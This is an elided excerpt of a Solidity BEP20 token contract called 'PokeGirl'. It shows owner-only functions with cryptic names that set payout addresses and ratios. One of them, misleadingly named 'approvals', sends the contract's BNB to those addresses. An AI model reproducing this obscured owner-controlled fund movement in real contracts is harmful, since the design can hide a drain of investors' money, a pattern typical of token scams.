...
contract PokeGirl is IBEP20, Auth {
    using SafeMath for uint256;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "PokeGirl";
    string constant _symbol = "PokeGirl";
    ...
    uint256 public sT = _totalSupply * 100 / 100000;
    ...
    function setrre(address _spE, address _nbE, address _jbE, address _mnbE, address _newra) external authorized {
        spE = _spE;
        nbE = _nbE;
        jbE = _jbE;
        mnbE = _mnbE;
    ...
    function approvals(uint256 _na, uint256 _da) external authorized {
        ...
        uint256 acBNBf = acBNBa.mul(cSn).div(cSd);
        uint256 acBNBs = acBNBa.mul(cSn).div(cSd);
        uint256 acBNBt = acBNBa.mul(cSn).div(cSd);
        (bool tmpSuccess,) = payable(spE).call{value: acBNBf, gas: gss}("");
        (tmpSuccess,) = payable(nbE).call{value: acBNBs, gas: gss}("");
        (tmpSuccess,) = payable(jbE).call{value: acBNBt, gas: gss}("");
        tmpSuccess = false;
    }
    ...
    function setcSn(uint256 _csn, uint256 _csd) external authorized {
        cSn = _csn;
        cSd = _csd;
    }
